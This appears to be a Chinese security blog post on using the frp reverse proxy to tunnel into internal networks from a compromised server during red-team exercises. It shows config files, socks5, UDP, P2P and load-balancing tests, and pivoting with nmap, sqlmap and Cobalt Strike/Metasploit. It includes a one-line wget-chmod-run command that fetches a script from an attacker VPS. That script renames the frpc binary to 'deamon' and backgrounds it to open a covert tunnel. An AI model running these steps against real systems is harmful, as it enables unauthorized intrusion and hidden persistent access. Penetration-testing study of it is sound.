> 原文链接: https://www.anquanke.com//post/id/184855 


# FRP 内网穿透


                                阅读量   
                                **524410**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">7</a>
                                </b>
                                                                                    



[![](https://p3.ssl.qhimg.com/t016cb5c5488571b280.png)](https://p3.ssl.qhimg.com/t016cb5c5488571b280.png)



## 一、前言

在HW过程中（真是令人折磨的过程），核心目标系统通常处于内网，攻击的方式也基本上是通过暴露在互联网的机器获取权限并将其作为跳板机，再进行进一步的内网渗透

获取一台应用系统的权限之后，我们可能需要对目标内部网络进行信息收集、服务探测、指纹识别、发起攻击等等过程，通常需要对一个C段乃至B段发送大量的数据包，因此一个稳定的内网穿透手段成为了重中之重

在以往的渗透中，拿到了服务器权限后，个人最常使用的内网代理方式是 reGeorg + Proxifier/proxychains，虽然是脚本代理的方式，但使用快捷方便，能够迅速访问到内部网，真的是日站渗透必备良药。可能是由于个人习惯原因，更喜欢在本地直接能打开对方的内网地址，使用自己电脑的常用工具进行工作，因此基本上首选就是这类脚本代理形式

但是随着目标内网环境越来越大，这种脚本形式代理的局限性越来越明显

除脚本外，还多次尝试过使用 CS+MSF 来进行内网控制，emmmmm 只能说有利有弊，具体环境的搭建在公众号“凌天实验室”或安百资讯平台中都发布了教程

在最近的HW中，一位老铁（某厂大佬）跟我推荐了 frp 内网穿透，于是就来尝试一下，网上关于 frp 的文章也还不少，但似乎都浅尝辄止，而且在 frp 不断更新中，更新了诸多新鲜特性，这次抽出几天时间着重测试一下，看看效果怎么样



## 二、简介

项目地址：[https://github.com/fatedier/frp](https://github.com/fatedier/frp)

在网络上可以搜索到诸多安装部署教程，可以看到 frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透

frp 采用go语言开发，如果你擅长此种编程语言，可以进行客制化修改，来满足不同的需求

更多的人使用 frp 是为了进行反代，满足通过公网服务器访问处于内网的服务，如访问内网web服务，远程ssh内网服务器，远程控制内网NAS等，实现类似花生壳、ngrok等功能

而对于内网渗透来讲，这种功能恰好能够满足我们进行内网渗透的流量转发



## 三、安装与配置

对于不同操作系统的用户，frp 提供了对应不同的软件，各位按需下载即可

[![](https://p3.ssl.qhimg.com/t010dbdc6dc8ee56c16.png)](https://p3.ssl.qhimg.com/t010dbdc6dc8ee56c16.png)

安装也没什么好装的，毕竟我们又看不懂 go 语言源码，把人家发布的的 release 下回来就得了

重点在于这个软件的配置文件，以及它的功能能在我们渗透中带来什么作用

首先这个工具有两端，服务端和客户端，服务端部署在我们具有公网IP的服务器上，客户端放在我们拿到权限的跳板服务器上，双端都需要对配置文件进行配置，我们先来完整的看一下双端的配置文件

服务端：[https://github.com/fatedier/frp/blob/master/conf/frps_full.ini](https://github.com/fatedier/frp/blob/master/conf/frps_full.ini)

```
# [common] 是必需的
[common]
# ipv6的文本地址或主机名必须括在方括号中
# 如"[::1]:80", "[ipv6-host]:http" 或 "[ipv6-host%zone]:80"
bind_addr = 0.0.0.0
bind_port = 7000

# udp nat 穿透端口
bind_udp_port = 7001

# 用于 kcp 协议 的 udp 端口，可以与 "bind_port" 相同
# 如果此项不配置, 服务端的 kcp 将不会启用 
kcp_bind_port = 7000

# 指定代理将侦听哪个地址，默认值与 bind_addr 相同
# proxy_bind_addr = 127.0.0.1

# 如果要支持虚拟主机，必须设置用于侦听的 http 端口（非必需项）
# 提示：http端口和https端口可以与 bind_port 相同
vhost_http_port = 80
vhost_https_port = 443

# 虚拟 http 服务器的响应头超时时间（秒），默认值为60s
# vhost_http_timeout = 60

# 设置 dashboard_addr 和 dashboard_port 用于查看 frps 仪表盘
# dashboard_addr 默认值与 bind_addr 相同
# 只有 dashboard_port 被设定，仪表盘才能生效
dashboard_addr = 0.0.0.0
dashboard_port = 7500

# 设置仪表盘用户密码，用于基础认证保护，默认为 admin/admin
dashboard_user = admin
dashboard_pwd = admin

# 仪表板资产目录(仅用于 debug 模式下)
# assets_dir = ./static
# 控制台或真实日志文件路径，如./frps.log
log_file = ./frps.log

# 日志级别，分为trace（跟踪）、debug（调试）、info（信息）、warn（警告）、error（错误） 
log_level = info

# 最大日志记录天数
log_max_days = 3

# 认证 token
token = 12345678

# 心跳配置, 不建议对默认值进行修改
# heartbeat_timeout 默认值为 90
# heartbeat_timeout = 90

# 允许 frpc(客户端) 绑定的端口，不设置的情况下没有限制
allow_ports = 2000-3000,3001,3003,4000-50000

# 如果超过最大值，每个代理中的 pool_count 将更改为 max_pool_count
max_pool_count = 5

# 每个客户端可以使用最大端口数，默认值为0，表示没有限制
max_ports_per_client = 0

# 如果 subdomain_host 不为空, 可以在客户端配置文件中设置 子域名类型为 http 还是 https
# 当子域名为 test 时, 用于路由的主机为 test.frps.com
subdomain_host = frps.com

# 是否使用 tcp 流多路复用，默认值为 true
tcp_mux = true

# 对 http 请求设置自定义 404 页面
# custom_404_page = /path/to/404.html
```

客户端：[https://github.com/fatedier/frp/blob/master/conf/frpc_full.ini](https://github.com/fatedier/frp/blob/master/conf/frpc_full.ini)

```
# [common] 是必需的
[common]
# ipv6的文本地址或主机名必须括在方括号中
# 如"[::1]:80", "[ipv6-host]:http" 或 "[ipv6-host%zone]:80"
server_addr = 0.0.0.0
server_port = 7000

# 如果要通过 http 代理或 socks5 代理连接 frps，可以在此处或全局代理中设置 http_proxy
# 只支持 tcp协议
# http_proxy = http://user:passwd@192.168.1.128:8080
# http_proxy = socks5://user:passwd@192.168.1.128:1080

# 控制台或真实日志文件路径，如./frps.log
log_file = ./frpc.log

# 日志级别，分为trace（跟踪）、debug（调试）、info（信息）、warn（警告）、error（错误）
log_level = info

# 最大日志记录天数
log_max_days = 3

# 认证 token
token = 12345678

# 设置能够通过 http api 控制客户端操作的管理地址
admin_addr = 127.0.0.1
admin_port = 7400
admin_user = admin
admin_pwd = admin

# 将提前建立连接，默认值为 0
pool_count = 5

# 是否使用 tcp 流多路复用，默认值为 true，必需与服务端相同
tcp_mux = true

# 在此处设置用户名后，代理名称将设置为  `{`用户名`}`.`{`代理名`}`
user = your_name

# 决定第一次登录失败时是否退出程序，否则继续重新登录到 frps
# 默认为 true
login_fail_exit = true

# 用于连接到服务器的通信协议
# 目前支持 tcp/kcp/websocket, 默认 tcp
protocol = tcp

# 如果 tls_enable 为 true, frpc 将会通过 tls 连接 frps
tls_enable = true

# 指定 DNS 服务器
# dns_server = 8.8.8.8

# 代理名, 使用 ',' 分隔
# 默认为空, 表示全部代理
# start = ssh,dns

# 心跳配置, 不建议对默认值进行修改
# heartbeat_interval 默认为 10 heartbeat_timeout 默认为 90
# heartbeat_interval = 30
# heartbeat_timeout = 90

# 'ssh' 是一个特殊代理名称
[ssh]
# 协议 tcp | udp | http | https | stcp | xtcp, 默认 tcp
type = tcp
local_ip = 127.0.0.1
local_port = 22
# 是否加密, 默认为 false
use_encryption = false
# 是否压缩
use_compression = false
# 服务端端口
remote_port = 6001
# frps 将为同一组中的代理进行负载平衡连接
group = test_group
# 组应该有相同的组密钥
group_key = 123456
# 为后端服务开启健康检查, 目前支持 'tcp' 和 'http' 
# frpc 将连接本地服务的端口以检测其健康状态
health_check_type = tcp
# 健康检查连接超时
health_check_timeout_s = 3
# 连续 3 次失败, 代理将会从服务端中被移除
health_check_max_failed = 3
# 健康检查时间间隔
health_check_interval_s = 10

[ssh_random]
type = tcp
local_ip = 127.0.0.1
local_port = 22
# 如果 remote_port 为 0 ,frps 将为您分配一个随机端口
remote_port = 0

# 如果要暴露多个端口, 在区块名称前添加 'range:' 前缀
# frpc 将会生成多个代理，如 'tcp_port_6010', 'tcp_port_6011'
[range:tcp_port]
type = tcp
local_ip = 127.0.0.1
local_port = 6010-6020,6022,6024-6028
remote_port = 6010-6020,6022,6024-6028
use_encryption = false
use_compression = false

[dns]
type = udp
local_ip = 114.114.114.114
local_port = 53
remote_port = 6002
use_encryption = false
use_compression = false

[range:udp_port]
type = udp
local_ip = 127.0.0.1
local_port = 6010-6020
remote_port = 6010-6020
use_encryption = false
use_compression = false

# 将域名解析到 [server_addr] 可以使用 http://web01.yourdomain.com 访问 web01
[web01]
type = http
local_ip = 127.0.0.1
local_port = 80
use_encryption = false
use_compression = true
# http 协议认证
http_user = admin
http_pwd = admin
# 如果服务端域名为 frps.com, 可以通过 http://test.frps.com 来访问 [web01] 
subdomain = web01
custom_domains = web02.yourdomain.com
# locations 仅可用于HTTP类型
locations = /,/pic
host_header_rewrite = example.com
# params with prefix "header_" will be used to update http request headers
header_X-From-Where = frp
health_check_type = http
# frpc 将会发送一个 GET http 请求 '/status' 来定位http服务
# http 服务返回 2xx 状态码时即为存活
health_check_url = /status
health_check_interval_s = 10
health_check_max_failed = 3
health_check_timeout_s = 3

[web02]
type = https
local_ip = 127.0.0.1
local_port = 8000
use_encryption = false
use_compression = false
subdomain = web01
custom_domains = web02.yourdomain.com
# v1 或 v2 或 空
proxy_protocol_version = v2

[plugin_unix_domain_socket]
type = tcp
remote_port = 6003
plugin = unix_domain_socket
plugin_unix_path = /var/run/docker.sock

[plugin_http_proxy]
type = tcp
remote_port = 6004
plugin = http_proxy
plugin_http_user = abc
plugin_http_passwd = abc

[plugin_socks5]
type = tcp
remote_port = 6005
plugin = socks5
plugin_user = abc
plugin_passwd = abc

[plugin_static_file]
type = tcp
remote_port = 6006
plugin = static_file
plugin_local_path = /var/www/blog
plugin_strip_prefix = static
plugin_http_user = abc
plugin_http_passwd = abc

[plugin_https2http]
type = https
custom_domains = test.yourdomain.com
plugin = https2http
plugin_local_addr = 127.0.0.1:80
plugin_crt_path = ./server.crt
plugin_key_path = ./server.key
plugin_host_header_rewrite = 127.0.0.1

[secret_tcp]
# 如果类型为 secret tcp, remote_port 将失效
type = stcp
# sk 用来进行访客认证
sk = abcdefg
local_ip = 127.0.0.1
local_port = 22
use_encryption = false
use_compression = false

# 访客端及服务端的用户名应该相同
[secret_tcp_visitor]
# frpc role visitor -&gt; frps -&gt; frpc role server
role = visitor
type = stcp
# 要访问的服务器名称
server_name = secret_tcp
sk = abcdefg
# 将此地址连接到访客 stcp 服务器
bind_addr = 127.0.0.1
bind_port = 9000
use_encryption = false
use_compression = false

[p2p_tcp]
type = xtcp
sk = abcdefg
local_ip = 127.0.0.1
local_port = 22
use_encryption = false
use_compression = false

[p2p_tcp_visitor]
role = visitor
type = xtcp
server_name = p2p_tcp
sk = abcdefg
bind_addr = 127.0.0.1
bind_port = 9001
use_encryption = false
use_compression = false
```

对于配置文件，frp 官方有中文文档，已经十分详尽

不得不说，虽然程序号称还处于开发中，但是通过配置文件可以看到已经支持很多好用的功能了，接下来根据在渗透测试中不同的需要来测试一下



## 四、功能性测试

本次测试模拟攻击者入侵网站进行渗透测试<br>
攻击者电脑：macbookpro 192.168.88.101<br>
攻击者VPS：ubuntu 103.242.135.137<br>
被入侵的服务器：centos 10.10.99.33<br>
内网其他应用：内网打印机 10.10.65.9

为了方便查看及调试，在测试过程中将持续开启服务端web页面，服务端配置为：

```
[common]
bind_addr = 0.0.0.0
bind_port = 7000

# IP 与 bind_addr 默认相同，可以不设置
# dashboard_addr = 0.0.0.0
# 端口必须设置，只有设置web页面才生效
dashboard_port = 7500
# 用户密码保平安
dashboard_user = su18
dashboard_pwd = X758@Kp9eG1xzyYS

# 允许客户端绑定的端口
allow_ports = 40000-50000
```

运行服务后可看到web端

[![](https://p1.ssl.qhimg.com/t010f60cdc45a0ab804.png)](https://p1.ssl.qhimg.com/t010f60cdc45a0ab804.png)

为了方便测试，在渗透测试机上建立文件

[http://103.242.135.137/3Edsr9I](http://103.242.135.137/3Edsr9I)

文件内容:

```
# 这里是要下载不同版本的 frp 文件
wget https://github.com/fatedier/frp/releases/download/v0.28.2/frp_0.28.2_linux_amd64.tar.gz -o /tmp/yU6te2.tar.gz
tar -zx /tmp/yU6te2.tar.gz frp_0.28.2_linux_amd64/frpc --strip-components 1
mv frpc deamon
rm -rf /tmp/yU6te2.tar.gz
# 这里写客户端配置文件
echo -e "[common]nserver_addr = 103.242.135.137nserver_port = 7000ntls_enable = truenpool_count = 5nn[plugin_socks]ntype = tcpnremote_port = 46075nplugin = socks5nplugin_user = josephnplugin_passwd = bnbm#yBZ90adnuse_encryption = truenuse_compression = true" &gt; delphi.ini
# 启动
nohup ./deamon -c delphi.ini &amp;
```

脚本比较简单不多说了

### <a class="reference-link" name="1.socks%E5%8D%8F%E8%AE%AE%E4%BB%A3%E7%90%86"></a>1.socks协议代理

首先最简单常用的就是socks协议代理，这一功能在 frp 中是以插件的形式实现的

客户端配置：

```
[common]
# 远程VPS地址
server_addr = 103.242.135.137
server_port = 7000
tls_enable = true
pool_count = 5


[plugin_socks]
type = tcp
remote_port = 46075
plugin = socks5
plugin_user = joseph
plugin_passwd = bnbm#yBZ90ad
use_encryption = true
use_compression = true
```

在被入侵的服务器上执行如下命令一键部署

wget [http://103.242.135.137/3Edsr9I](http://103.242.135.137/3Edsr9I) &gt;/dev/null 2&gt;&amp;1 &amp;&amp; chmod +x 3Edsr9I &amp;&amp; ./3Edsr9I &amp;&amp; rm -rf 3Edsr9I

可以看到 Client Counts 及 Proxy Counts 均产生了变化

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01919c366379d72c9b.png)

此时我们将流量通过 socks 协议指到服务端，是用 shadowsocks/Proxifier/proxychains 就看个人爱好了

我的爱好是 Proxifier，配置好 socks IP/端口/身份认证 后可以看到成功代理访问到内网打印机

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t017714df03835324f5.png)

因为在渗透测试过程中一直使用 reGeorg + Proxifier，跟这种实际上是差不多的

如果常用的工具中有指定代理的功能，也可以直接进行配置，无需 Proxifier 等工具，例如 Burpsuite

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01cd6c22f97d1cddaf.png)

在大多数情况下，到目前为止简单的配置已经能够满足大部分的需求，说白了作为一名 web 狗，你会的攻击手段90% 是 http 协议，可能还会用点 msf，发点 tcp 流的攻击 payload 等等，总而言之基本上都是 tcp 协议的攻击

而至于 UDP，socks5 协议在本质上是已经支持 UDP 协议，虽然协议是支持了，但是你所使用的工具、代理、软件等端级的代码并不一定能够支持，这将会直接导致 UDP 协议的数据包无法进行交互

### <a class="reference-link" name="2.UDP%E5%8D%8F%E8%AE%AE%E4%BB%A3%E7%90%86"></a>2.UDP协议代理

frp 也同时能够对 UDP 协议进行转发，配置上与 tcp 也是差不多的，基本上就是端口转发，把你想要发送数据包的端口通过隧道映射出来，配置上没什么难度

```
[dns]
type = udp
local_ip = *.*.*.*
local_port = *
remote_port = 42231
```

对于UDP协议的测试，我们使用比较常见的SNMP协议和DNS协议来测试

首先是SNMP协议，端口161，在渗透测试过程中扫内网的时候，难免会遇见两个打印机，在攻击打印机的时候基本是抱着蚊子再小也是肉的情况去渗透的

但是在一次渗透中，对于服务器段的工作已经完成了，想要进一步的入侵管理员的办公网段，扫了很久都没有得到有效的网段，于是想到了打印机，通过 snmp 协议和 惠普的 pjl 来获得敏感信息，拿出了连接打印机的网段，并后续成功打入管理员电脑

这次就依旧来复现一下这个过程，我们通过 frp 隧道对公司内网打印机 10.10.65.9 进行攻击，使用的是打印机攻击框架 PRET，简单的打印一个文档

[![](https://p4.ssl.qhimg.com/t019a9c1009d2497876.png)](https://p4.ssl.qhimg.com/t019a9c1009d2497876.png)

下图可以看到成功打印（吹一波 ver007，哈哈）

[![](https://p4.ssl.qhimg.com/t010831201194592bc0.png)](https://p4.ssl.qhimg.com/t010831201194592bc0.png)

可以利用这个框架进行很多的操作，这里不细说了

接下来我们测试 DNS，DNS 接触的更多，UDP 53端口，将域名解析成为IP

模拟一下场景，首先对于目标来说，有很多的子域名，这些子域名解析为内网 IP 地址，我们在得到一台服务器权限后，通过扫描 53 端口或其他手段找到了内网的 DNS 服务器，接下来我们将 DNS 解析指到内网服务器上，因此我们就可以通过域名访问内网服务器，也可以指定 DNS 服务器进行子域名爆破，来发现更多的资产

用于测试的内网 DNS 服务器为 10.10.100.132，将多个 baidu.com的子域名解析到了内网地址，而被入侵的服务器没有指定这个DNS，我们需要扫描端口发现 DNS 服务器，然后进行 DNS 解析指定及子域名爆破

首先对内目标网段的 53 端口进行扫描探测，扫描端口使用 TCP 协议就可以，所以先使用原先的代理扫描，这部分比较简单就不截图了

然后再客户端添加配置，重新启动服务：

```
[dns]
type = udp
local_ip = 10.10.100.132
local_port = 53
remote_port = 40053
use_encryption = true
use_compression = true
```

使用 dig 命令测试一下对 www.baidu.com 的解析，可以看得到域名成功解析到我们设定的 10.10.232.22，证明内网代理成功

[![](https://p3.ssl.qhimg.com/t01804f6de6c564b85e.png)](https://p3.ssl.qhimg.com/t01804f6de6c564b85e.png)

直接现场造个玩具车轮子指定DNS服务器查询子域名：

[![](https://p5.ssl.qhimg.com/t019fe7faa1778dd086.png)](https://p5.ssl.qhimg.com/t019fe7faa1778dd086.png)

可以看到一些在内网DNS服务器上事先设置好的子域名如 vpn/oa/test/admin/mail/m 等等被解析到了内网IP地址中

### <a class="reference-link" name="3.%E7%82%B9%E5%AF%B9%E7%82%B9(%20stcp%20%E4%B8%8E%20xtcp%20)"></a>3.点对点( stcp 与 xtcp )

安全地暴露内网服务（secret tcp）以及 xtcp 都是frp提供的点对点传输服务，xtcp用于应对在希望传输大量数据且流量不经过服务器的场景，这就直接是一个 p2p 的隧道

根据官方文档，这种协议不能穿透所有类型的 NAT 设备，所以穿透成功率较低。穿透失败时可以尝试 stcp 的方式

其实 stcp 就相当于再添加一次认证，改一次配置文件即可，我们直接测试一下 xtcp

服务器端添加UDP绑定端口：

```
bind_udp_port = 7001
```

客户端1（被入侵的服务器）配置文件：

```
[common]
server_addr = 103.242.135.137
server_port = 7000
tls_enable = true
pool_count = 5


[p2p_socks]
type = xtcp
remote_port = 46075
sk = HjnllUwX5WiRD5Ij
plugin = socks5
```

客户端2（攻击者电脑—我的mac）配置文件：

```
[common]
server_addr = 103.242.135.137
server_port = 7000
tls_enable = true
pool_count = 5


[p2p_socks_visitor]
type = xtcp
role = visitor
server_name = p2p_socks
sk = HjnllUwX5WiRD5Ij
bind_addr = 127.0.0.1
bind_port = 1086
```

激动人心的时刻到了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e7784fbf493d7385.png)

没错，报了一屏幕的 i/o timeout

惊不惊喜，意不意外

frp 所谓的 xtcp 协议，应用的应该是一个 UDP 打洞的过程（瞎猜的，反正也懒得看源码，看也看不懂）

过程：

> <p>1、准备一台服务器，放在公网上，与客户端甲和乙通信，记录客户端甲和乙的 IP 和端口信息，这些IP和端口并非甲和乙在内网的IP和端口，而是通过NAT方式映射到路由器上的IP和端口。<br>
2、客户端甲向服务器发送udp消息，请求和客户端乙通信。<br>
3、服务器向客户端甲发送消息，消息内容包含客户端乙的IP和端口信息。<br>
4、服务器向客户端乙发送消息，消息内容包含客户端甲的IP和端口信息。<br>
5、客户端甲根据3步骤获得的信息向客户端乙发送udp消息，同一时刻客户端乙根据3步骤获得的信息向客户端甲发送udp消息，尝试多次，udp打洞就能成功。</p>

这种打洞只支持 ConeNAT（锥形 NAT），不支持 Symmetric NAT （对称NAT），因此没办法能够支持全部的 NAT方式，更何况，你知道你在访问公网的时候中间经过了多少层 NAT 吗，因此这项功能不用纠结，不好用就不好用，静待更好的解决方案。

### <a class="reference-link" name="4.%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1"></a>4.负载均衡

如果我们在内网拿到了多台能够访问互联网机器，可以启用多台客户端，进行负载均衡，毕竟突然从一台机器迸发出大量流量很容易引起管理员的注意，也可以负载分担一下机器的CPU资源消耗

目前只支持 TCP 和 HTTP 类型的 proxy，但是之前说过，作为web狗完全够用

我们使用两台被入侵的服务器作为负载均衡，IP分别为 10.10.99.33 和 10.10.100.81

服务器一、二配置相同：

```
[common]
# 远程VPS地址
server_addr = 103.242.135.137
server_port = 7000
tls_enable = true
pool_count = 5


[plugin_socks]
# [plugin_socks_2]
type = tcp
remote_port = 46075
plugin = socks5
plugin_user = joseph
plugin_passwd = bnbm#yBZ90ad
use_encryption = true
use_compression = true
group = socks_balancing
group_key = NGbB5#8n
```

这部分相同的点是 group/group_key/remote_port，两台服务器名是不同的

部署完成后可以在管理端看到这两个插件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01d98b5a3c00639d37.png)

再次连接代理时，可以发现两个客户端都产生了流量

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0185c471a5ecbbc0d7.png)

我们再设置一台web应用服务器，IP地址为 10.10.100.135

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0129b4af7ccae04630.png)

在浏览器中打开网址并多次刷新，在 apache 的日志中发现了来自两个IP的访问

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0111d434ea5b115a2e.png)

这说明负载均衡的功能是好用的，很强势

### <a class="reference-link" name="5.%E5%85%B6%E4%BB%96%E5%8A%9F%E8%83%BD"></a>5.其他功能

转发 Unix 域套接字：单个主机通信协议，一般用不上

对外提供文件访问服务：这估计是渗透测试工程师最不需要的功能

http转https：没用

加密与压缩：这两个功能可以看到我都启用了

TLS加密：这个我也开了，安全性更高

客户端UI/热加载配置/查看状态：普通情况下是可以不用的，但是前期资产发现过程需要多次配置的情况，或者上线新机器做负载均衡的时候可以使用，不过热加载还是需要等一段时间才能够生效，性子急的我表示等不了

端口白名单：这里我指定了 40000-50000

web相关的：很多功能是为了将内网web转至公网，对我们来讲基本不用

通过代理连接 frps：在特殊情况下可能是有用的，但是暂时没用

范围端口映射：这个貌似也没什么用

子域名：在找到内网DNS解析服务器的情况下可以不进行配置，如果没找到，但是知道内网 IP 和域名的对应关系，且服务器只可以通过域名访问的情况下可以使用这项配置，但我觉得都不如绑个host来的快

KCP协议：KCP是一个快速可靠协议，能以比 TCP浪费10%-20%的带宽的代价，换取平均延迟降低 30%-40%，且最大延迟降低三倍的传输效果，在带宽很足但延迟较高的情况下可以使用 kcp 协议进行数据通信，未测试

等等



## 五、性能测试

性能测试，将使用 socks5 协议进行代理，nmap 扫描内网 C 段全端口，以及 SQLMAP level 5 risk 3 threads 10 对内网漏洞靶场进行 sql 注入测试。使用两台内网服务器进行负载均衡，来测试一下速度和准确性

### <a class="reference-link" name="1.%20NMAP%20%E6%89%AB%E6%8F%8F%E5%85%A8%E7%AB%AF%E5%8F%A3%E6%B5%8B%E8%AF%95"></a>1. NMAP 扫描全端口测试

proxychains + nmap 扫 10.10.100.0/24 全端口

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0115921bae1c6ad91b.png)

因为 socks 协议没法代理 icmp ，因此 nmap 参数使用了 -Pn 避免 nmap 使用 ping 来检测主机存活，nmap 会无论是否有存活主机均扫描完全部的端口

对于不存在的主机 nmap 的速度大概在 3分半 一台机，

将这个完整的网段扫完，大概需要两天的时间，感觉速度还是可以接受的

趁着公司网管出差扫了一波内网美滋滋，要不然分分钟被封

### <a class="reference-link" name="2.%20SQLMAP%20%E5%AE%8C%E5%85%A8%E4%BD%93%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95"></a>2. SQLMAP 完全体注入测试

使用内网 mongodb 的注入靶场试试

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0148d7b80bd09d46c0.png)

SQLMAP自带设置代理的选项，我们添加一些参数，然后进行测试

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013d6488bd20a32fc5.png)

设置代理

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01bfdd8a7bdc49a0e4.png)

GO~

流量也成功被负载

[![](https://p1.ssl.qhimg.com/t01e54ce94946742970.png)](https://p1.ssl.qhimg.com/t01e54ce94946742970.png)

因为我的上行网速确实是感人，我还开了网易云音乐，所以客观上速度确实慢点

从开始到结束一共耗时 3 个小时左右，因为 sqlmap 不支持 mongodb，所以没有结果

这个速度，额。。。。



## 六、配合性测试

对内网进行信息探测时，简直是八仙过海各显神通，每位渗透测试工程师，每个团队都有自己常用的手段，内网穿透的方式也不同，所以各位看官在将 frp 用于实际工作中之前一定要自测，是否满足自己的习惯。

在最近几次 HW 中，见到非常多的队伍在拿到服务器权限后，将自己的工具包直接拖到入侵的服务器上，各种小工具，各种exe，扫端口的，扫 IIS PUT 的，扫 17010 的等等，说真的，我都偷偷保存下来，搜集了不少，哈哈哈

不是说这种方式不行，而是太不优雅了，不符合一天要敷8张面膜的妮妮尔优雅大使洛洛梨的典雅气质（能看懂这句话的都是变态QAQ），因此我们通常使用一些后渗透测试框架进行集中管理，比如 CS msf 等

如果我们希望使用 CS 进行总控，frp 作为数据通信隧道，使用msf进行攻击，其实也可以实现

接下来再模拟一个场景，我们拿到一台服务器，CS 上线，使用 frp 隧道建立连接，msf 使用 frp 隧道进行攻击，获取 session 后再转给 CS ，很简单的过程

frp 服务端地址：103.242.135.137

CS 服务端地址：144.48.9.229

被入侵的第一台服务器地址：10.10.99.33

第二台被入侵服务器地址： 192.168.88.85（虚拟机）

首先得到第一台被入侵服务器的权限，设置 frp 客户端

配置 frp 服务端：

```
[common]
bind_addr = 0.0.0.0
bind_port = 7000
bind_udp_port = 7001

dashboard_port = 7500
dashboard_user = su18
dashboard_pwd = X758@Kp9eG1xzyYS
```

配置 frp 客户端：

```
[common]
server_addr = 103.242.135.137
server_port = 7000
tls_enable = true
pool_count = 5


[plugin_socks]
type = tcp
remote_port = 46075
plugin = socks5
use_encryption = true
use_compression = true
group = socks_balancing
group_key = NGbB5#8n
```

配置成功后可以看到线上出现一台代理

[![](https://p1.ssl.qhimg.com/t01a8a9437f4ec2a10c.png)](https://p1.ssl.qhimg.com/t01a8a9437f4ec2a10c.png)

接下来使用 proxychains + msf 进行组合攻击，再将 session 转到 cs 中，套路比较常见无需多言，也就没截图

我们直接跳到 CS 2.6 管理界面（实际上就是 Armitage ），如下图，不小心点了一下 ARP 探测

[![](https://p2.ssl.qhimg.com/t01e592273c73083c09.png)](https://p2.ssl.qhimg.com/t01e592273c73083c09.png)

再次现场造一个玩具车轮子，这次是 cs的插件，简单造一个

导入插件，并选择

